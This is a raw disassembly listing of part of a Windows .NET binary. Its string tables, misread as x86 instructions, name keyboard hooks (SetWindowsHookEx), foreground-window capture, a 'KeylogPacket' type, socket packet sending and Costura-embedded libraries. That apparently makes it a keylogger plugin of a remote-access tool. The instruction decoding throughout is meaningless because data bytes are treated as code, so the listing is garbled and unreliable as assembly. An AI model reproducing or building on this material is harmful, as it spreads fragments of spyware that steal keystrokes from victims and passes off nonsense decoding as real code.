  40a1d3:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1d4:	74 41                	je     0x40a217
  40a1d6:	72 67                	jb     0x40a23f
  40a1d8:	73 00                	jae    0x40a1da
  40a1da:	45                   	inc    %ebp
  40a1db:	71 75                	jno    0x40a252
  40a1dd:	61                   	popa
  40a1de:	6c                   	insb   (%dx),%es:(%edi)
  40a1df:	73 00                	jae    0x40a1e1
  40a1e1:	50                   	push   %eax
  40a1e2:	61                   	popa
  40a1e3:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a1e6:	74 4c                	je     0x40a234
  40a1e8:	69 62 2e 55 74 69 6c 	imul   $0x6c697455,0x2e(%edx),%esp
  40a1ef:	73 00                	jae    0x40a1f1
  40a1f1:	53                   	push   %ebx
  40a1f2:	79 73                	jns    0x40a267
  40a1f4:	74 65                	je     0x40a25b
  40a1f6:	6d                   	insl   (%dx),%es:(%edi)
  40a1f7:	2e 57                	cs push %edi
  40a1f9:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  40a200:	46                   	inc    %esi
  40a201:	6f                   	outsl  %ds:(%esi),(%dx)
  40a202:	72 6d                	jb     0x40a271
  40a204:	73 00                	jae    0x40a206
  40a206:	47                   	inc    %edi
  40a207:	65 74 43             	gs je  0x40a24d
  40a20a:	75 72                	jne    0x40a27e
  40a20c:	72 65                	jb     0x40a273
  40a20e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a20f:	74 50                	je     0x40a261
  40a211:	72 6f                	jb     0x40a282
  40a213:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a216:	73 00                	jae    0x40a218
  40a218:	67 65 74 5f          	addr16 gs je 0x40a27b
  40a21c:	42                   	inc    %edx
  40a21d:	61                   	popa
  40a21e:	73 65                	jae    0x40a285
  40a220:	41                   	inc    %ecx
  40a221:	64 64 72 65          	fs fs jb 0x40a28a
  40a225:	73 73                	jae    0x40a29a
  40a227:	00 53 79             	add    %dl,0x79(%ebx)
  40a22a:	73 74                	jae    0x40a2a0
  40a22c:	65 6d                	gs insl (%dx),%es:(%edi)
  40a22e:	2e 4e                	cs dec %esi
  40a230:	65 74 2e             	gs je  0x40a261
  40a233:	53                   	push   %ebx
  40a234:	6f                   	outsl  %ds:(%esi),(%dx)
  40a235:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a238:	74 73                	je     0x40a2ad
  40a23a:	00 49 6d             	add    %cl,0x6d(%ecx)
  40a23d:	70 6f                	jo     0x40a2ae
  40a23f:	72 74                	jb     0x40a2b5
  40a241:	73 00                	jae    0x40a243
  40a243:	4d                   	dec    %ebp
  40a244:	69 73 63 65 6c 6c 61 	imul   $0x616c6c65,0x63(%ebx),%esi
  40a24b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a24c:	65 6f                	outsl  %gs:(%esi),(%dx)
  40a24e:	75 73                	jne    0x40a2c3
  40a250:	00 47 65             	add    %al,0x65(%edi)
  40a253:	74 41                	je     0x40a296
  40a255:	6c                   	insb   (%dx),%es:(%edi)
  40a256:	6c                   	insb   (%dx),%es:(%edi)
  40a257:	4b                   	dec    %ebx
  40a258:	65 79 73             	gs jns 0x40a2ce
  40a25b:	00 43 6f             	add    %al,0x6f(%ebx)
  40a25e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a25f:	63 61 74             	arpl   %esp,0x74(%ecx)
  40a262:	00 4f 62             	add    %cl,0x62(%edi)
  40a265:	6a 65                	push   $0x65
  40a267:	63 74 00 6f          	arpl   %esi,0x6f(%eax,%eax,1)
  40a26b:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a26e:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  40a272:	6e                   	outsb  %ds:(%esi),(%dx)
  40a273:	64 43                	fs inc %ebx
  40a275:	6f                   	outsl  %ds:(%esi),(%dx)
  40a276:	6e                   	outsb  %ds:(%esi),(%dx)
  40a277:	6e                   	outsb  %ds:(%esi),(%dx)
  40a278:	65 63 74 00 50       	arpl   %esi,%gs:0x50(%eax,%eax,1)
  40a27d:	61                   	popa
  40a27e:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a281:	74 4c                	je     0x40a2cf
  40a283:	69 62 2e 50 61 63 6b 	imul   $0x6b636150,0x2e(%edx),%esp
  40a28a:	65 74 00             	gs je  0x40a28d
  40a28d:	49                   	dec    %ecx
  40a28e:	50                   	push   %eax
  40a28f:	61                   	popa
  40a290:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a293:	74 00                	je     0x40a295
  40a295:	53                   	push   %ebx
  40a296:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a298:	64 50                	fs push %eax
  40a29a:	61                   	popa
  40a29b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a29e:	74 00                	je     0x40a2a0
  40a2a0:	50                   	push   %eax
  40a2a1:	61                   	popa
  40a2a2:	72 73                	jb     0x40a317
  40a2a4:	65 50                	gs push %eax
  40a2a6:	61                   	popa
  40a2a7:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a2aa:	74 00                	je     0x40a2ac
  40a2ac:	53                   	push   %ebx
  40a2ad:	65 72 69             	gs jb  0x40a319
  40a2b0:	61                   	popa
  40a2b1:	6c                   	insb   (%dx),%es:(%edi)
  40a2b2:	69 7a 65 50 61 63 6b 	imul   $0x6b636150,0x65(%edx),%edi
  40a2b9:	65 74 00             	gs je  0x40a2bc
  40a2bc:	44                   	inc    %esp
  40a2bd:	65 73 65             	gs jae 0x40a325
  40a2c0:	72 69                	jb     0x40a32b
  40a2c2:	61                   	popa
  40a2c3:	6c                   	insb   (%dx),%es:(%edi)
  40a2c4:	69 7a 65 50 61 63 6b 	imul   $0x6b636150,0x65(%edx),%edi
  40a2cb:	65 74 00             	gs je  0x40a2ce
  40a2ce:	4b                   	dec    %ebx
  40a2cf:	65 79 6c             	gs jns 0x40a33e
  40a2d2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2d3:	67 50                	addr16 push %eax
  40a2d5:	61                   	popa
  40a2d6:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a2d9:	74 00                	je     0x40a2db
  40a2db:	42                   	inc    %edx
  40a2dc:	75 66                	jne    0x40a344
  40a2de:	66 65 72 50          	data16 gs jb 0x40a332
  40a2e2:	61                   	popa
  40a2e3:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a2e6:	74 00                	je     0x40a2e8
  40a2e8:	67 65 74 5f          	addr16 gs je 0x40a34b
  40a2ec:	63 75 72             	arpl   %esi,0x72(%ebp)
  40a2ef:	72 65                	jb     0x40a356
  40a2f1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2f2:	74 50                	je     0x40a344
  40a2f4:	61                   	popa
  40a2f5:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a2f8:	74 00                	je     0x40a2fa
  40a2fa:	70 61                	jo     0x40a35d
  40a2fc:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a2ff:	74 00                	je     0x40a301
  40a301:	53                   	push   %ebx
  40a302:	6f                   	outsl  %ds:(%esi),(%dx)
  40a303:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a306:	74 00                	je     0x40a308
  40a308:	67 65 74 5f          	addr16 gs je 0x40a36b
  40a30c:	73 6f                	jae    0x40a37d
  40a30e:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a311:	74 00                	je     0x40a313
  40a313:	73 65                	jae    0x40a37a
  40a315:	74 5f                	je     0x40a376
  40a317:	73 6f                	jae    0x40a388
  40a319:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a31c:	74 00                	je     0x40a31e
  40a31e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a31f:	70 5f                	jo     0x40a380
  40a321:	45                   	inc    %ebp
  40a322:	78 70                	js     0x40a394
  40a324:	6c                   	insb   (%dx),%es:(%edi)
  40a325:	69 63 69 74 00 67 65 	imul   $0x65670074,0x69(%ebx),%esp
  40a32c:	74 5f                	je     0x40a38d
  40a32e:	68 61 73 54 6f       	push   $0x6f547361
  40a333:	45                   	inc    %ebp
  40a334:	78 69                	js     0x40a39f
  40a336:	74 00                	je     0x40a338
  40a338:	73 65                	jae    0x40a39f
  40a33a:	74 5f                	je     0x40a39b
  40a33c:	68 61 73 54 6f       	push   $0x6f547361
  40a341:	45                   	inc    %ebp
  40a342:	78 69                	js     0x40a3ad
  40a344:	74 00                	je     0x40a346
  40a346:	49                   	dec    %ecx
  40a347:	41                   	inc    %ecx
  40a348:	73 79                	jae    0x40a3c3
  40a34a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a34b:	63 52 65             	arpl   %edx,0x65(%edx)
  40a34e:	73 75                	jae    0x40a3c5
  40a350:	6c                   	insb   (%dx),%es:(%edi)
  40a351:	74 00                	je     0x40a353
  40a353:	72 65                	jb     0x40a3ba
  40a355:	73 75                	jae    0x40a3cc
  40a357:	6c                   	insb   (%dx),%es:(%edi)
  40a358:	74 00                	je     0x40a35a
  40a35a:	54                   	push   %esp
  40a35b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a35c:	4c                   	dec    %esp
  40a35d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a35e:	77 65                	ja     0x40a3c5
  40a360:	72 49                	jb     0x40a3ab
  40a362:	6e                   	outsb  %ds:(%esi),(%dx)
  40a363:	76 61                	jbe    0x40a3c6
  40a365:	72 69                	jb     0x40a3d0
  40a367:	61                   	popa
  40a368:	6e                   	outsb  %ds:(%esi),(%dx)
  40a369:	74 00                	je     0x40a36b
  40a36b:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40a36e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a36f:	74 00                	je     0x40a371
  40a371:	54                   	push   %esp
  40a372:	68 72 65 61 64       	push   $0x64616572
  40a377:	53                   	push   %ebx
  40a378:	74 61                	je     0x40a3db
  40a37a:	72 74                	jb     0x40a3f0
  40a37c:	00 43 6f             	add    %al,0x6f(%ebx)
  40a37f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a380:	6e                   	outsb  %ds:(%esi),(%dx)
  40a381:	65 63 74 53 74       	arpl   %esi,%gs:0x74(%ebx,%edx,2)
  40a386:	61                   	popa
  40a387:	72 74                	jb     0x40a3fd
  40a389:	00 67 65             	add    %ah,0x65(%edi)
  40a38c:	74 5f                	je     0x40a3ed
  40a38e:	70 6f                	jo     0x40a3ff
  40a390:	72 74                	jb     0x40a406
  40a392:	00 48 6f             	add    %cl,0x6f(%eax)
  40a395:	73 74                	jae    0x40a40b
  40a397:	00 67 65             	add    %ah,0x65(%edi)
  40a39a:	74 5f                	je     0x40a3fb
  40a39c:	68 6f 73 74 00       	push   $0x74736f
  40a3a1:	73 65                	jae    0x40a408
  40a3a3:	74 5f                	je     0x40a404
  40a3a5:	68 6f 73 74 00       	push   $0x74736f
  40a3aa:	47                   	inc    %edi
  40a3ab:	65 74 4b             	gs je  0x40a3f9
  40a3ae:	65 79 62             	gs jns 0x40a413
  40a3b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3b2:	61                   	popa
  40a3b3:	72 64                	jb     0x40a419
  40a3b5:	4c                   	dec    %esp
  40a3b6:	61                   	popa
  40a3b7:	79 6f                	jns    0x40a428
  40a3b9:	75 74                	jne    0x40a42f
  40a3bb:	00 53 79             	add    %dl,0x79(%ebx)
  40a3be:	73 74                	jae    0x40a434
  40a3c0:	65 6d                	gs insl (%dx),%es:(%edi)
  40a3c2:	2e 54                	cs push %esp
  40a3c4:	65 78 74             	gs js  0x40a43b
  40a3c7:	00 47 65             	add    %al,0x65(%edi)
  40a3ca:	74 57                	je     0x40a423
  40a3cc:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40a3d3:	78 74                	js     0x40a449
  40a3d5:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40a3d9:	74 00                	je     0x40a3db
  40a3db:	67 65 74 5f          	addr16 gs je 0x40a43e
  40a3df:	4e                   	dec    %esi
  40a3e0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3e1:	77 00                	ja     0x40a3e3
  40a3e3:	47                   	inc    %edi
  40a3e4:	65 74 46             	gs je  0x40a42d
  40a3e7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3e8:	72 65                	jb     0x40a44f
  40a3ea:	67 72 6f             	addr16 jb 0x40a45c
  40a3ed:	75 6e                	jne    0x40a45d
  40a3ef:	64 57                	fs push %edi
  40a3f1:	69 6e 64 6f 77 00 54 	imul   $0x5400776f,0x64(%esi),%ebp
  40a3f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3f9:	55                   	push   %ebp
  40a3fa:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3fb:	69 63 6f 64 65 45 78 	imul   $0x78456564,0x6f(%ebx),%esp
  40a402:	00 55 6e             	add    %dl,0x6e(%ebp)
  40a405:	68 6f 6f 6b 57       	push   $0x576b6f6f
  40a40a:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  40a411:	6f                   	outsl  %ds:(%esi),(%dx)
  40a412:	6f                   	outsl  %ds:(%esi),(%dx)
  40a413:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  40a417:	53                   	push   %ebx
  40a418:	65 74 57             	gs je  0x40a472
  40a41b:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  40a422:	6f                   	outsl  %ds:(%esi),(%dx)
  40a423:	6f                   	outsl  %ds:(%esi),(%dx)
  40a424:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  40a428:	43                   	inc    %ebx
  40a429:	61                   	popa
  40a42a:	6c                   	insb   (%dx),%es:(%edi)
  40a42b:	6c                   	insb   (%dx),%es:(%edi)
  40a42c:	4e                   	dec    %esi
  40a42d:	65 78 74             	gs js  0x40a4a4
  40a430:	48                   	dec    %eax
  40a431:	6f                   	outsl  %ds:(%esi),(%dx)
  40a432:	6f                   	outsl  %ds:(%esi),(%dx)
  40a433:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  40a437:	50                   	push   %eax
  40a438:	72 6f                	jb     0x40a4a9
  40a43a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a43d:	73 65                	jae    0x40a4a4
  40a43f:	64 42                	fs inc %edx
  40a441:	79 46                	jns    0x40a489
  40a443:	6f                   	outsl  %ds:(%esi),(%dx)
  40a444:	64 79 00             	fs jns 0x40a447
  40a447:	4d                   	dec    %ebp
  40a448:	61                   	popa
  40a449:	70 56                	jo     0x40a4a1
  40a44b:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  40a452:	65 79 00             	gs jns 0x40a455
  40a455:	43                   	inc    %ebx
  40a456:	6f                   	outsl  %ds:(%esi),(%dx)
  40a457:	6e                   	outsb  %ds:(%esi),(%dx)
  40a458:	74 61                	je     0x40a4bb
  40a45a:	69 6e 73 4b 65 79 00 	imul   $0x79654b,0x73(%esi),%ebp
  40a461:	77 56                	ja     0x40a4b9
  40a463:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  40a46a:	67 65 74 5f          	addr16 gs je 0x40a4cd
  40a46e:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40a472:	73 65                	jae    0x40a4d9
  40a474:	74 5f                	je     0x40a4d5
  40a476:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40a47a:	52                   	push   %edx
  40a47b:	65 73 6f             	gs jae 0x40a4ed
  40a47e:	6c                   	insb   (%dx),%es:(%edi)
  40a47f:	76 65                	jbe    0x40a4e6
  40a481:	41                   	inc    %ecx
  40a482:	73 73                	jae    0x40a4f7
  40a484:	65 6d                	gs insl (%dx),%es:(%edi)
  40a486:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40a48a:	52                   	push   %edx
  40a48b:	65 61                	gs popa
  40a48d:	64 45                	fs inc %ebp
  40a48f:	78 69                	js     0x40a4fa
  40a491:	73 74                	jae    0x40a507
  40a493:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  40a49a:	6d                   	insl   (%dx),%es:(%edi)
  40a49b:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40a49f:	47                   	inc    %edi
  40a4a0:	65 74 45             	gs je  0x40a4e8
  40a4a3:	78 65                	js     0x40a50a
  40a4a5:	63 75 74             	arpl   %esi,0x74(%ebp)
  40a4a8:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  40a4af:	6d                   	insl   (%dx),%es:(%edi)
  40a4b0:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40a4b4:	41                   	inc    %ecx
  40a4b5:	64 64 72 65          	fs fs jb 0x40a51e
  40a4b9:	73 73                	jae    0x40a52e
  40a4bb:	46                   	inc    %esi
  40a4bc:	61                   	popa
  40a4bd:	6d                   	insl   (%dx),%es:(%edi)
  40a4be:	69 6c 79 00 43 6c 65 	imul   $0x61656c43,0x0(%ecx,%edi,2),%ebp
  40a4c5:	61 
  40a4c6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4c7:	4d                   	dec    %ebp
  40a4c8:	65 6d                	gs insl (%dx),%es:(%edi)
  40a4ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4cb:	72 79                	jb     0x40a546
  40a4cd:	00 6f 70             	add    %ch,0x70(%edi)
  40a4d0:	5f                   	pop    %edi
  40a4d1:	45                   	inc    %ebp
  40a4d2:	71 75                	jno    0x40a549
  40a4d4:	61                   	popa
  40a4d5:	6c                   	insb   (%dx),%es:(%edi)
  40a4d6:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40a4dd:	49 
  40a4de:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4df:	65 71 75             	gs jno 0x40a557
  40a4e2:	61                   	popa
  40a4e3:	6c                   	insb   (%dx),%es:(%edi)
  40a4e4:	69 74 79 00 49 73 4e 	imul   $0x754e7349,0x0(%ecx,%edi,2),%esi
  40a4eb:	75 
  40a4ec:	6c                   	insb   (%dx),%es:(%edi)
  40a4ed:	6c                   	insb   (%dx),%es:(%edi)
  40a4ee:	4f                   	dec    %edi
  40a4ef:	72 45                	jb     0x40a536
  40a4f1:	6d                   	insl   (%dx),%es:(%edi)
  40a4f2:	70 74                	jo     0x40a568
  40a4f4:	79 00                	jns    0x40a4f6
  40a4f6:	00 00                	add    %al,(%eax)
  40a4f8:	00 07                	add    %al,(%edi)
  40a4fa:	3f                   	aas
  40a4fb:	00 3f                	add    %bh,(%edi)
  40a4fd:	00 3f                	add    %bh,(%edi)
  40a4ff:	00 00                	add    %al,(%eax)
  40a501:	01 00                	add    %eax,(%eax)
  40a503:	03 5b 00             	add    0x0(%ebx),%ebx
  40a506:	00 03                	add    %al,(%ebx)
  40a508:	5d                   	pop    %ebp
  40a509:	00 00                	add    %al,(%eax)
  40a50b:	0b 53 00             	or     0x0(%ebx),%edx
  40a50e:	70 00                	jo     0x40a510
  40a510:	61                   	popa
  40a511:	00 63 00             	add    %ah,0x0(%ebx)
  40a514:	65 00 00             	add    %al,%gs:(%eax)
  40a517:	0d 52 00 65 00       	or     $0x650052,%eax
  40a51c:	74 00                	je     0x40a51e
  40a51e:	75 00                	jne    0x40a520
  40a520:	72 00                	jb     0x40a522
  40a522:	6e                   	outsb  %ds:(%esi),(%dx)
  40a523:	00 00                	add    %al,(%eax)
  40a525:	0d 45 00 73 00       	or     $0x730045,%eax
  40a52a:	63 00                	arpl   %eax,(%eax)
  40a52c:	61                   	popa
  40a52d:	00 70 00             	add    %dh,0x0(%eax)
  40a530:	65 00 00             	add    %al,%gs:(%eax)
  40a533:	09 42 00             	or     %eax,0x0(%edx)
  40a536:	61                   	popa
  40a537:	00 63 00             	add    %ah,0x0(%ebx)
  40a53a:	6b 00 00             	imul   $0x0,(%eax),%eax
  40a53d:	07                   	pop    %es
  40a53e:	54                   	push   %esp
  40a53f:	00 61 00             	add    %ah,0x0(%ecx)
  40a542:	62 00                	bound  %eax,(%eax)
  40a544:	00 03                	add    %al,(%ebx)
  40a546:	20 00                	and    %al,(%eax)
  40a548:	00 11                	add    %dl,(%ecx)
  40a54a:	5b                   	pop    %ebx
  40a54b:	00 45 00             	add    %al,0x0(%ebp)
  40a54e:	4e                   	dec    %esi
  40a54f:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40a553:	00 52 00             	add    %dl,0x0(%edx)
  40a556:	5d                   	pop    %ebp
  40a557:	00 0a                	add    %cl,(%edx)
  40a559:	00 00                	add    %al,(%eax)
  40a55b:	0d 5b 00 45 00       	or     $0x45005b,%eax
  40a560:	53                   	push   %ebx
  40a561:	00 43 00             	add    %al,0x0(%ebx)
  40a564:	5d                   	pop    %ebp
  40a565:	00 0a                	add    %cl,(%edx)
  40a567:	00 00                	add    %al,(%eax)
  40a569:	0d 5b 00 42 00       	or     $0x42005b,%eax
  40a56e:	61                   	popa
  40a56f:	00 63 00             	add    %ah,0x0(%ebx)
  40a572:	6b 00 5d             	imul   $0x5d,(%eax),%eax
  40a575:	00 00                	add    %al,(%eax)
  40a577:	0d 5b 00 54 00       	or     $0x54005b,%eax
  40a57c:	61                   	popa
  40a57d:	00 62 00             	add    %ah,0x0(%edx)
  40a580:	5d                   	pop    %ebp
  40a581:	00 0a                	add    %cl,(%edx)
  40a583:	00 00                	add    %al,(%eax)
  40a585:	07                   	pop    %es
  40a586:	0a 00                	or     (%eax),%al
  40a588:	0d 00 5b 00 00       	or     $0x5b00,%eax
  40a58d:	07                   	pop    %es
  40a58e:	5d                   	pop    %ebp
  40a58f:	00 20                	add    %ah,(%eax)
  40a591:	00 5b 00             	add    %bl,0x0(%ebx)
  40a594:	00 03                	add    %al,(%ebx)
  40a596:	0a 00                	or     (%eax),%al
  40a598:	00 17                	add    %dl,(%edi)
  40a59a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40a59e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a59f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5a2:	70 00                	jo     0x40a5a4
  40a5a4:	72 00                	jb     0x40a5a6
  40a5a6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a5aa:	73 00                	jae    0x40a5ac
  40a5ac:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40a5b1:	03 2e                	add    (%esi),%ebp
  40a5b3:	00 00                	add    %al,(%eax)
  40a5b5:	0f 63 00             	packsswb (%eax),%mm0
  40a5b8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5b9:	00 73 00             	add    %dh,0x0(%ebx)
  40a5bc:	74 00                	je     0x40a5be
  40a5be:	75 00                	jne    0x40a5c0
  40a5c0:	72 00                	jb     0x40a5c2
  40a5c2:	61                   	popa
  40a5c3:	00 00                	add    %al,(%eax)
  40a5c5:	3d 63 00 6f 00       	cmp    $0x6f0063,%eax
  40a5ca:	73 00                	jae    0x40a5cc
  40a5cc:	74 00                	je     0x40a5ce
  40a5ce:	75 00                	jne    0x40a5d0
  40a5d0:	72 00                	jb     0x40a5d2
  40a5d2:	61                   	popa
  40a5d3:	00 2e                	add    %ch,(%esi)
  40a5d5:	00 63 00             	add    %ah,0x0(%ebx)
  40a5d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5d9:	00 73 00             	add    %dh,0x0(%ebx)
  40a5dc:	74 00                	je     0x40a5de
  40a5de:	75 00                	jne    0x40a5e0
  40a5e0:	72 00                	jb     0x40a5e2
  40a5e2:	61                   	popa
  40a5e3:	00 2e                	add    %ch,(%esi)
  40a5e5:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40a5e9:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40a5ed:	00 63 00             	add    %ah,0x0(%ebx)
  40a5f0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5f1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5f4:	70 00                	jo     0x40a5f6
  40a5f6:	72 00                	jb     0x40a5f8
  40a5f8:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a5fc:	73 00                	jae    0x40a5fe
  40a5fe:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40a603:	13 70 00             	adc    0x0(%eax),%esi
  40a606:	61                   	popa
  40a607:	00 63 00             	add    %ah,0x0(%ebx)
  40a60a:	6b 00 65             	imul   $0x65,(%eax),%eax
  40a60d:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40a611:	00 69 00             	add    %ch,0x0(%ecx)
  40a614:	62 00                	bound  %eax,(%eax)
  40a616:	00 41 63             	add    %al,0x63(%ecx)
  40a619:	00 6f 00             	add    %ch,0x0(%edi)
  40a61c:	73 00                	jae    0x40a61e
  40a61e:	74 00                	je     0x40a620
  40a620:	75 00                	jne    0x40a622
  40a622:	72 00                	jb     0x40a624
  40a624:	61                   	popa
  40a625:	00 2e                	add    %ch,(%esi)
  40a627:	00 70 00             	add    %dh,0x0(%eax)
  40a62a:	61                   	popa
  40a62b:	00 63 00             	add    %ah,0x0(%ebx)
  40a62e:	6b 00 65             	imul   $0x65,(%eax),%eax
  40a631:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40a635:	00 69 00             	add    %ch,0x0(%ecx)
  40a638:	62 00                	bound  %eax,(%eax)
  40a63a:	2e 00 64 00 6c       	add    %ah,%cs:0x6c(%eax,%eax,1)
  40a63f:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40a643:	00 63 00             	add    %ah,0x0(%ebx)
  40a646:	6f                   	outsl  %ds:(%esi),(%dx)
  40a647:	00 6d 00             	add    %ch,0x0(%ebp)
  40a64a:	70 00                	jo     0x40a64c
  40a64c:	72 00                	jb     0x40a64e
  40a64e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a652:	73 00                	jae    0x40a654
  40a654:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40a659:	00 00                	add    %al,(%eax)
  40a65b:	00 15 fe 7f 35 d8    	add    %dl,0xd8357ffe
  40a661:	31 1f                	xor    %ebx,(%edi)
  40a663:	45                   	inc    %ebp
  40a664:	95                   	xchg   %eax,%ebp
  40a665:	53                   	push   %ebx
  40a666:	c5 f9 db d6          	vpand  %xmm6,%xmm0,%xmm2
  40a66a:	6b 86 00 08 b7 7a 5c 	imul   $0x5c,0x7ab70800(%esi),%eax
  40a671:	56                   	push   %esi
  40a672:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40a675:	89 03                	mov    %eax,(%ebx)
  40a677:	00 00                	add    %al,(%eax)
  40a679:	01 03                	add    %eax,(%ebx)
  40a67b:	06                   	push   %es
  40a67c:	12 09                	adc    (%ecx),%cl
  40a67e:	03 06                	add    (%esi),%eax
  40a680:	12 0d 05 20 02 01    	adc    0x1022005,%cl
  40a686:	1c 18                	sbb    $0x18,%al
  40a688:	05 20 01 01 12       	add    $0x12010120,%eax
  40a68d:	11 03                	adc    %eax,(%ebx)
  40a68f:	20 00                	and    %al,(%eax)
  40a691:	01 02                	add    %eax,(%edx)
  40a693:	06                   	push   %es
  40a694:	18 05 00 02 02 18    	sbb    %al,0x18020200
  40a69a:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40a69d:	00 12                	add    %dl,(%edx)
  40a69f:	19 04 20             	sbb    %eax,(%eax,%eiz,1)
  40a6a2:	00 12                	add    %dl,(%edx)
  40a6a4:	1d 03 20 00 18       	sbb    $0x18002003,%eax
  40a6a9:	06                   	push   %es
  40a6aa:	07                   	pop    %es
  40a6ab:	03 12                	add    (%edx),%edx
  40a6ad:	09 09                	or     %ecx,(%ecx)
  40a6af:	0e                   	push   %cs
  40a6b0:	04 20                	add    $0x20,%al
  40a6b2:	01 01                	add    %eax,(%ecx)
  40a6b4:	08 03                	or     %al,(%ebx)
  40a6b6:	20 00                	and    %al,(%eax)
  40a6b8:	0e                   	push   %cs
  40a6b9:	03 00                	add    (%eax),%eax
  40a6bb:	00 0e                	add    %cl,(%esi)
  40a6bd:	0c 07                	or     $0x7,%al
  40a6bf:	07                   	pop    %es
  40a6c0:	12 09                	adc    (%ecx),%cl
  40a6c2:	1d 05 09 18 09       	sbb    $0x9180905,%eax
  40a6c7:	0e                   	push   %cs
  40a6c8:	11 29                	adc    %ebp,(%ecx)
  40a6ca:	04 00                	add    $0x0,%al
  40a6cc:	01 0e                	add    %ecx,(%esi)
  40a6ce:	09 11                	or     %edx,(%ecx)
  40a6d0:	07                   	pop    %es
  40a6d1:	0b 08                	or     (%eax),%ecx
  40a6d3:	02 0e                	add    (%esi),%cl
  40a6d5:	11 29                	adc    %ebp,(%ecx)
  40a6d7:	0e                   	push   %cs
  40a6d8:	12 09                	adc    (%ecx),%cl
  40a6da:	11 31                	adc    %esi,(%ecx)
  40a6dc:	08 0e                	or     %cl,(%esi)
  40a6de:	12 09                	adc    (%ecx),%cl
  40a6e0:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40a6e3:	01 18                	add    %ebx,(%eax)
  40a6e5:	08 04 00             	or     %al,(%eax,%eax,1)
  40a6e8:	01 08                	add    %ecx,(%eax)
  40a6ea:	18 06                	sbb    %al,(%esi)
  40a6ec:	00 03                	add    %al,(%ebx)
  40a6ee:	0e                   	push   %cs
  40a6ef:	0e                   	push   %cs
  40a6f0:	0e                   	push   %cs
  40a6f1:	0e                   	push   %cs
  40a6f2:	05 00 02 02 0e       	add    $0xe020200,%eax
  40a6f7:	0e                   	push   %cs
  40a6f8:	04 00                	add    $0x0,%al
